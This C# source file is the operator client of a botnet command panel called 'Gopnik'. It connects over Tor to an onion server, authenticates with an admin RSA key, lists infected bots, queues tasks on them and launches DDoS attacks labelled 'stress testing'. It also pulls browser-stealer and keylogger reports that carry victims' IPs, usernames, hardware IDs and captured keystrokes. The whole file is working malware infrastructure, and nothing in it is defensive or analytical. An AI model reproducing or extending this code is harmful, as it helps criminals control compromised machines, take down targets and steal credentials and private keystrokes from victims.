using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

using Controller.Core.Config;
using Controller.Network.Protocol;
using Controller.Security;
using Controller.Utilities;
using Controller.Forms;
using System.Threading;

namespace Controller.Network.Gopnik
{
    enum STATISTICS_TYPE : int
    {
        INFORMATION = 0,
        OS = 1,
        COUNTRY = 2
    }
    #region MASTER_PACKET
    enum MASTER_PACKET : byte
    {
        LOGIN = 0x1,
        LOGIN_KEY = 0x2,
        BOTLIST = 0x3,
        TASKLIST = 0x4,
        ADD_TASK = 0x5,
        REMOVE_TASK = 0x6,
        STATISTICS = 0x7,
        DDOSLIST = 0x8,
        DDOS = 0x9,
        STEALERLIST = 0x10,
        KEYLOGLIST = 0x11,
        KEYLOG = 0x12,
        KEYLOG_REMOVE = 0x13,
        BROWSER_STEALER_TAG = 0x14,
        KEYLOG_TAG = 0x15
    }
    #endregion

    class CGopnikClient
    {
        #region EVENTS
        #region SOCKET_EVENTS
        //Sockets
        public delegate void delOnConnected();
        public event delOnConnected OnConnected;
        public delegate void delOnDisconnect();
        public event delOnDisconnect OnDisconnect;
        #endregion

        #region AUTH_EVENTS
        //Authorization
        public delegate void delOnLogin(String strBotnetname);
        public event delOnLogin OnLogin;
        public delegate void delOnResultsPerPage();
        public event delOnResultsPerPage OnResultsPerPage;
        #endregion

        #region BOTLIST_EVENTS
        //Botlist
        public delegate void delOnTotalBots(Int32 iTotalBots, Int32 iOnlineBots);
        public event delOnTotalBots OnTotalBots;
        public delegate void delOnBots(String[] arr_strBots, Int32 iPage);
        public event delOnBots OnBots;
        #endregion

        #region MAIN_TASK_EVENTS
        //Tasklist
        public delegate void delOnTotalMainTasks(Int32 iTotalMainTasks);
        public event delOnTotalMainTasks OnTotalMainTasks;
        public delegate void delOnTotalMainTasksPages(Int32 iTotalMainTasksPages);
        public event delOnTotalMainTasksPages OnTotalMainTasksPages;
        public delegate void delOnMainTasks(String[] arr_strTasks);
        public event delOnMainTasks OnMainTasks;
        public delegate void delOnMainTaskRemoved(Int32 iTaskID);
        public event delOnMainTaskRemoved OnMainTaskRemoved;
        #endregion

        #region STRESS_TESTING_EVENTS
        //Stress Testing
        public delegate void delOnDdosList(string[] arr_strDdoslist);
        public event delOnDdosList OnDdosList;
        public delegate void delOnTotalDdos(int iTotalDdos);
        public event delOnTotalDdos OnTotalDdos;
        #endregion

        #region REPORTS_EVENTS
        //Browser Stealer
        public delegate void delOnTotalReportsBrowser(int iTotalReportsBrowser);
        public event delOnTotalReportsBrowser OnTotalReportsBrowser;

        public delegate void delOnBrowserStealer(string[] arr_strData, int iPage);
        public event delOnBrowserStealer OnBrowserStealer;

        //Keylogger
        public delegate void delOnTotalKeylogReports(int iTotalKeylogReports);
        public event delOnTotalKeylogReports OnTotalKeylogReports;

        public delegate void delOnKeylogReports(string[] arr_strKeylogReports, int iPage);
        public event delOnKeylogReports OnKeylogReports;

        public delegate void delOnKeylogReport(string[] arr_strReportData);
        public event delOnKeylogReport OnKeylogReport;

        public delegate void delOnKeylogReportRemoved(int iReportID);
        public event delOnKeylogReportRemoved OnKeylogReportRemoved;

        #endregion

        #region LOG_EVENTS
        public delegate void delOnControllerLog(String strData);
        public event delOnControllerLog OnControllerLog;
        #endregion

        #region STATISTICS_EVENTS
        public delegate void delOnOSStatistics(string[] arr_strOSInfo);
        public event delOnOSStatistics OnOSStatistics;
        public delegate void delOnCountryStatistics(string[] arr_strCountryInfo);
        public event delOnCountryStatistics OnCountryStatistics;
        #endregion

        #region TRANSFER_EVENTS
        public delegate void delOnHeaderReceived(CPacketHeader Header);
        public event delOnHeaderReceived OnHeaderReceived;
        public delegate void delOnPacketReceived(CPacket Packet);
        public event delOnPacketReceived OnPacketReceived;
        public delegate void delOnBlockReceived(string strPacketID);
        public event delOnBlockReceived OnBlockReceived;
        #endregion

        #endregion

        #region PRIVATE_VARIABLES
        private CClientSocket m_ClientSocket = null;
        private Boolean IsAuthorized = false;
        #endregion

        #region CONSTRUCTOR
        public CGopnikClient()
        {
            m_ClientSocket = new CClientSocket(Program.ControllerConfig.OnionAddress, Program.ControllerConfig.OnionPort, Program.ControllerConfig.Tor_Host, Program.ControllerConfig.Tor_Port);

            m_ClientSocket.OnClientConnected += m_ClientSocket_OnClientConnected;
            m_ClientSocket.OnClientReceiveData += m_ClientSocket_OnClientReceiveData;
            m_ClientSocket.OnClientDisconnect += m_ClientSocket_OnClientDisconnect;
            
            m_ClientSocket.OnHeaderReceived += delegate(CPacketHeader Header)
            {
                if (this.OnHeaderReceived != null) 
                    this.OnHeaderReceived.Invoke(Header);
            };

            m_ClientSocket.OnBlockReceived += delegate(string strPacketID)
            {
                if (this.OnBlockReceived != null)
                    this.OnBlockReceived.Invoke(strPacketID);
            };

            m_ClientSocket.OnLog += m_ClientSocket_OnLog;
        }
        #endregion

        #region ON_LOG_EVENT_HANDLER
        void m_ClientSocket_OnLog(string strData)
        {
            if (OnControllerLog != null) OnControllerLog.Invoke(strData);
        }
        #endregion

        #region IS_RUNNING
        public Boolean IsRunning()
        {
            return this.m_ClientSocket.IsRunning();
        }
        #endregion

        #region START
        public void Start()
        {
            m_ClientSocket.Start();
        }
        #endregion

        #region STOP
        public void Stop()
        {
            m_ClientSocket.Stop();
        }
        #endregion

        void m_ClientSocket_OnClientReceiveData(CPacket Packet)
        {
            if (this.OnPacketReceived != null) this.OnPacketReceived.Invoke(Packet);
            try
            {
                #region PARSE_ARGUMENTS
                byte[] arr_bArguments = Packet.GetPacketBufferFromBlocks();
                String[] arr_strArguments = null;

                if (arr_bArguments != null)
                {
                    arr_strArguments = UnicodeEncoding.Unicode.GetString(arr_bArguments, 0, arr_bArguments.Length).Split('|');
                }
                #endregion

                MASTER_PACKET MasterPacket = (MASTER_PACKET)Packet.PacketHeader.Packet;
                switch (MasterPacket)
                {
                    #region LOGIN_PACKET
                    case MASTER_PACKET.LOGIN:
                        {
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.LOGIN_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted LOGIN Packet received.");
                                break;
                            }

                            /*
                             * [0] = Botnet name
                             */

                            if (this.OnLogin != null)
                                this.OnLogin.Invoke(arr_strArguments[0]);

                            this.IsAuthorized = true;

                            m_ClientSocket_OnLog("LOGIN Packet received. You are now authorized.");
                        }
                        break;
                    #endregion

                    #region LOGIN_KEY_PACKET
                    case MASTER_PACKET.LOGIN_KEY:
                        {
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.LOGIN_KEY_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted LOGIN_KEY Packet received.");
                                break;
                            }

                            Int32 iData = -1;

                            if (Int32.TryParse(arr_strArguments[0], out iData))
                            {
                                if (iData == 1) //Server requested Public Key a.k.a First authorization
                                {
                                    m_ClientSocket_OnLog("Server asked for Public-Key");

                                    CPacket PublicKey = m_ClientSocket.CreatePacket((Byte)MASTER_PACKET.LOGIN_KEY, Program.ControllerConfig.AdminPublicKey);

                                    if (!m_ClientSocket.SendPacket(PublicKey))
                                    {
                                        m_ClientSocket_OnLog("Failed to send Public-Key to server.");
                                        m_ClientSocket.Disconnect();
                                    }
                                    else m_ClientSocket_OnLog("Public-Key sent to server.");
                                }
                            }
                            else
                            {
                                m_ClientSocket_OnLog("Received Encrypted Random-Message for Authorization");

                                //This is the random encrypted message
                                Byte[] arr_bEncryptedAuth = Convert.FromBase64String(arr_strArguments[0]);

                                //Decrypt it with Private Key
                                arr_bEncryptedAuth = CRSA.Decrypt(arr_bEncryptedAuth, Program.ControllerConfig.AdminPrivateKey, 2048);

                                //Failed to decrypt
                                if (arr_bEncryptedAuth == null)
                                {
                                    m_ClientSocket_OnLog("Failed to decrypt Random-Message");
                                    m_ClientSocket.Disconnect();
                                    return;
                                }

                                //Send plain-text response to confirm authorization
                                /*if (!m_ClientSocket.SendData(this.BuildPacket(MASTER_PACKET.LOGIN_KEY, arr_bEncryptedAuth)))
                                    m_ClientSocket.Disconnect();*/

                                CPacket AuthPacket = m_ClientSocket.CreatePacket((Byte)MASTER_PACKET.LOGIN_KEY, arr_bEncryptedAuth);

                                if (!m_ClientSocket.SendPacket(AuthPacket))
                                {
                                    m_ClientSocket_OnLog("Failed to send decrypted Random-Message. Authorization failed.");
                                    m_ClientSocket.Disconnect();
                                }
                                else m_ClientSocket_OnLog("Decrypted Random-Message sent to Server. Authorization complete. Waiting for answer.");
                            }
                        }
                        break;
                    #endregion

                    #region BOTLIST_PACKET
                    case MASTER_PACKET.BOTLIST:
                        {
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.BOTLIST_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted BOTLIST packet received.");
                                break;
                            }

                            /*
                             * [0] = Botlist
                             * [1] = Page
                             */
                            int iCurrentBotPage = -1;
                            if (Int32.TryParse(arr_strArguments[1], out iCurrentBotPage))
                            {
                                Program.ControllerConfig.CurrentBotPage = iCurrentBotPage;

                                String[] arr_strBots = arr_strArguments[0].Split(';');

                                if (this.OnBots != null)
                                    this.OnBots.Invoke(arr_strBots, Program.ControllerConfig.CurrentBotPage);

                                m_ClientSocket_OnLog("BOTLIST packet received. Your Botlist has been updated.");
                            }
                        }
                        break;
                    #endregion

                    #region TASKLIST_PACKET
                    case MASTER_PACKET.TASKLIST:
                        {
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.TASKLIST_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted TASKLIST packet received.");
                                break;
                            }
                            /*
                             * arr_strArguments:
                             * [0] = Tasks
                             * [1] = Page
                             */


                            String[] arr_strTasks = arr_strArguments[0].Split(';');

                            if (OnMainTasks != null)
                            {
                                OnMainTasks.Invoke(arr_strTasks);

                                m_ClientSocket_OnLog("TASKLIST packet received. Your Main Tasklist has been updated.");
                            }

                        }
                        break;
                    #endregion

                    #region REMOVE_TASK_PACKET
                    case MASTER_PACKET.REMOVE_TASK:
                        {
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.TASK_REMOVE_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted REMOVE_TASK Packet received.");
                                break;
                            }

                            Int32 iRemovedTaskID = -1;

                            if(Int32.TryParse(arr_strArguments[0], out iRemovedTaskID))
                            {
                                if (OnMainTaskRemoved != null)
                                {
                                    OnMainTaskRemoved.Invoke(iRemovedTaskID);
                                    m_ClientSocket_OnLog(String.Format("REMOVE_TASK packet received. Task: {0} has been removed.",
                                        iRemovedTaskID));
                                }
                            }
                        }
                        break;
                    #endregion

                    #region STATISTICS_PACKET
                    case MASTER_PACKET.STATISTICS:
                        {
                        	if(!this.IsAuthorized) this.m_ClientSocket.Disconnect();
                        	
                            if (arr_strArguments == null || arr_strArguments.Length != CConstants.STATISTICS_ARGUMENT_COUNT)
                            {
                                m_ClientSocket_OnLog("Corrupted STATISTICS packet received.");
                                break;
                            }

                            int iStatisticsType = -1;

                            if (!int.TryParse(arr_strArguments[0], out iStatisticsType)) break;

                            STATISTICS_TYPE StatisticsType = (STATISTICS_TYPE)iStatisticsType;

                            switch(StatisticsType)
                            {
                                case STATISTICS_TYPE.INFORMATION:
                                    string[] arr_strInfoData = arr_strArguments[1].Split(';');

                                    if (arr_strInfoData.Length != 8) break;

                                    /*
                            * arr_strArguments:
                            * [0] = Total Bots
                            * [1] = Online Bots
                            * [2] = Total Bot Pages
                            * [3] = Total Main Tasks
                            * [4] = Total Main Tasks Pages
                            * [5] = Total Browser Stealer
                            * [6] = Total Keylog Reports
                            */
                                    int iTotalBots, iOnlineBots, iTotalMainTasks, iTotalDdosTasks, iTotalBrowserStealer, iTotalKeylogReports;
                                    int iAVGCPU;
                                    if (Int32.TryParse(arr_strInfoData[0], out iTotalBots) &&
                                        Int32.TryParse(arr_strInfoData[1], out iOnlineBots) &&
                                        Int32.TryParse(arr_strInfoData[2], out iTotalMainTasks) &&
                                        Int32.TryParse(arr_strInfoData[3], out Program.ControllerConfig.ResultsPerPage) &&
                                        int.TryParse(arr_strInfoData[4], out iTotalDdosTasks) &&
                                        int.TryParse(arr_strInfoData[5], out iTotalBrowserStealer) &&
                                        int.TryParse(arr_strInfoData[6], out iTotalKeylogReports) &&
                                        int.TryParse(arr_strInfoData[7], out iAVGCPU))
                                    {
                                        if (this.OnTotalBots != null)
                                            this.OnTotalBots.Invoke(iTotalBots, iOnlineBots);

                                        Program.ControllerConfig.TotalBotPages = CUtils.GetPageCount(iTotalBots);

                                        if (this.OnTotalMainTasks != null) this.OnTotalMainTasks.Invoke(iTotalMainTasks);

                                        if (this.OnResultsPerPage != null) this.OnResultsPerPage.Invoke();

                                        if (this.OnTotalDdos != null) this.OnTotalDdos.Invoke(iTotalDdosTasks);

                                        Program.ControllerConfig.TotalBrowserStealer = iTotalBrowserStealer;
                                        Program.ControllerConfig.TotalStealerPages = CUtils.GetPageCount(iTotalBrowserStealer);
                                        Program.ControllerConfig.TotalKeylog = iTotalKeylogReports;
                                        Program.ControllerConfig.TotalKeylogPages = CUtils.GetPageCount(iTotalKeylogReports);

                                        // if (this.OnTotalKeylogReports != null) this.OnTotalKeylogReports.Invoke(iTotalKeylogReports);

                                        Program.ControllerConfig.AverageCPUUsage = iAVGCPU;
                                        m_ClientSocket_OnLog("Information STATISTICS packet received. Statistics has been updated.");
                                    }
                                    break;
                                case STATISTICS_TYPE.OS:
                                    string[] arr_strOSData = arr_strArguments[1].Split(';');

                                    if (arr_strOSData != null && this.OnOSStatistics != null)
                                        this.OnOSStatistics.Invoke(arr_strOSData);

                                    m_ClientSocket_OnLog("OS STATISTICS packet received. OS Statistics has been updated.");
                                    break;
                                case STATISTICS_TYPE.COUNTRY:
                                    string[] arr_strCountryData = arr_strArguments[1].Split(';');

                                    if (arr_strCountryData != null && this.OnCountryStatistics != null)
                                        this.OnCountryStatistics.Invoke(arr_strCountryData);

                                    m_ClientSocket_OnLog("Country STATISTICS packet received. Country Statistics has been updated.");
                                    break;
                                default: break;
                            } 
                        }
                        break;
                    #endregion

                    #region DDOSLIST_PACKET
                    case MASTER_PACKET.DDOSLIST:
                        {
                        	string[] arr_strDdoslist = null;
                        	
                        	if(arr_strArguments != null && arr_strArguments.Length == CConstants.DDOSLIST_ARGUMENT_COUNT)
                        	{
                        		arr_strDdoslist = arr_strArguments[0].Split(';');
                        	}
                        	
                        	if(this.OnDdosList != null)
                        		this.OnDdosList.Invoke(arr_strDdoslist);
                        }
                        break;
                    #endregion

                    #region STEALERLIST_PACKET
                    case MASTER_PACKET.STEALERLIST:
                        {
                            if(arr_strArguments == null || arr_strArguments.Length != 2)
                            {
                                m_ClientSocket_OnLog("Corrupted STEALERLIST packet received.");
                                break;
                            }

                            int iPage = -1;

                            if (!int.TryParse(arr_strArguments[1], out iPage)) break;

                            var StealerList = arr_strArguments[0].Split(';');

                            if (this.OnBrowserStealer != null)
                                this.OnBrowserStealer.Invoke(StealerList, iPage);
                        }
                        break;
                    #endregion

                    #region KEYLOGLIST_PACKET
                    case MASTER_PACKET.KEYLOGLIST:
                        {
                            if(arr_strArguments == null || arr_strArguments.Length != 2)
                            {
                                m_ClientSocket_OnLog("Corrupted KEYLOGLIST packet received.");
                                break;
                            }

                            int iPage = -1;

                            if (!int.TryParse(arr_strArguments[1], out iPage)) break;

                            var KeylogList = arr_strArguments[0].Split(';');

                            if (this.OnKeylogReports != null)
                                this.OnKeylogReports.Invoke(KeylogList, iPage);
                        }
                        break;
                    #endregion

                    #region KEYLOG_REPORT_PACKET
                    case MASTER_PACKET.KEYLOG:
                        {
                            if(arr_strArguments == null || arr_strArguments.Length != 1)
                            {
                                m_ClientSocket_OnLog("Corrupted KEYLOG Report packet received.");
                                break;
                            }

                            var arr_strReportData = arr_strArguments[0].Split('*');
                            /*
                             * [0] = Title
                             * [1] = Length
                             * [2] = Bot ID
                             * [3] = Data
                             * [4] = ID
                             * [5] = Bot IPv4
                             * [6] = Bot OS
                             * [7] = Bot Username
                             * [8] = Bot HWID
                             */

                            if(arr_strReportData.Length != 9)
                            {
                                m_ClientSocket_OnLog("Corrupted KEYLOG Report data.");
                                break;
                            }

                            if (this.OnKeylogReport != null) this.OnKeylogReport.Invoke(arr_strReportData);
                        }
                        break;
                    #endregion

                    #region KEYLOG_REMOVE_PACKET
                    case MASTER_PACKET.KEYLOG_REMOVE:
                        {
                            if(arr_strArguments == null || arr_strArguments.Length != 1)
                            {
                                m_ClientSocket_OnLog("Corrupted KEYLOG_REMOVE packet received.");
                                break;
                            }

                            int iReportID = -1;

                            if (!int.TryParse(arr_strArguments[0], out iReportID)) break;

                            if (this.OnKeylogReportRemoved != null)
                                this.OnKeylogReportRemoved.Invoke(iReportID);
                        }
                        break;
                    #endregion

                    default:
                        {
                            m_ClientSocket_OnLog("Unknown Packet received.");
                            break;
                        }
                }
            }
            catch { }
        }

        void m_ClientSocket_OnClientDisconnect()
        {
            this.IsAuthorized = false;

            if (this.OnDisconnect != null)
                this.OnDisconnect.Invoke();

            m_ClientSocket_OnLog("You have disconnected from server.");
        }

        void m_ClientSocket_OnClientConnected()
        {
            if (this.OnConnected != null)
                this.OnConnected.Invoke();

            try
            {
                CPacket LoginPacket = m_ClientSocket.CreatePacket((Byte)MASTER_PACKET.LOGIN, String.Format("{0}|{1}", Program.ControllerConfig.AdminUsername, Program.ControllerConfig.AdminPassword));

                if(!m_ClientSocket.SendPacket(LoginPacket))
                {
                    m_ClientSocket_OnLog("Failed to send Login Packet");
                    m_ClientSocket.Disconnect();
                }
            }
            catch { }
        }

        #region SEND_PACKET
        bool SendPacket(byte bPacket, string strArguments)
        {
            if (!m_ClientSocket.IsConnected() || !this.IsAuthorized) return false;

            try
            {
                CPacket New_Packet = m_ClientSocket.CreatePacket(bPacket, strArguments);

                return m_ClientSocket.SendPacket(New_Packet);
            }
            catch { }

            return false;
        }
        #endregion

        #region GET_BOT_LIST
        public Boolean GetBotlist(Int32 iPage)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.BOTLIST, iPage.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send Botlist Packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region GET_TASK_LIST
        public Boolean GetTasklist(Int32 iPage)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.TASKLIST, iPage.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send Tasklist Packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region ADD_TASK
        public Boolean AddTask(Int32 iTask, String strArguments, Int32 iExecutes)
        {
            bool bSent = this.SendPacket(
                (byte)MASTER_PACKET.ADD_TASK, string.Format(
                "{0}|{1}|{2}",
                iTask, strArguments, iExecutes)
                );

            if (!bSent)
            {
                m_ClientSocket_OnLog("Failed to send AddTask Packet");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region REMOVE_TASK
        public Boolean RemoveTask(Int32 iTaskID)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.REMOVE_TASK, iTaskID.ToString());

            if (!bSent)
            {
                m_ClientSocket_OnLog("Failed to send RemoveTask packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region GET_DDOS_LIST
        public bool GetDdosList()
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.DDOSLIST, string.Empty);

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send DdosList packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region ADD_DDOS
        public bool AddDdos(string strArguments)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.DDOS, strArguments);

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send AddDdos packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region GET_BROWSER_STEALER_LIST
        public bool GetBrowserStealer(int iPage)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.STEALERLIST, iPage.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send BrowserStealerList packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region GET_KEYLOGGER_LIST
        public bool GetKeyloggerList(int iPage)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.KEYLOGLIST, iPage.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send Keyloglist packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region GET_KEYLOG_REPORT
        public bool GetKeylogReport(int iID)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.KEYLOG, iID.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send GetKeylogReport packet.");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region REMOVE_KEYLOG_REPORT
        public bool RemoveKeylogReport(int iID)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.KEYLOG_REMOVE, iID.ToString());

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send RemoveKeylogReport Packet");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region SET_BROWSER_STEALER_TAG
        public bool SetBrowserStealerTag(string strTag)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.BROWSER_STEALER_TAG, strTag);

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send BROWSERSTEALERTAG packet");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

        #region SET_KEYLOGGER_TAG
        public bool SetKeyloggerTag(string strTag)
        {
            bool bSent = this.SendPacket((byte)MASTER_PACKET.KEYLOG_TAG, strTag);

            if(!bSent)
            {
                m_ClientSocket_OnLog("Failed to send KEYLOG_TAG packet");
                m_ClientSocket.Disconnect();
            }

            return bSent;
        }
        #endregion

    }
}
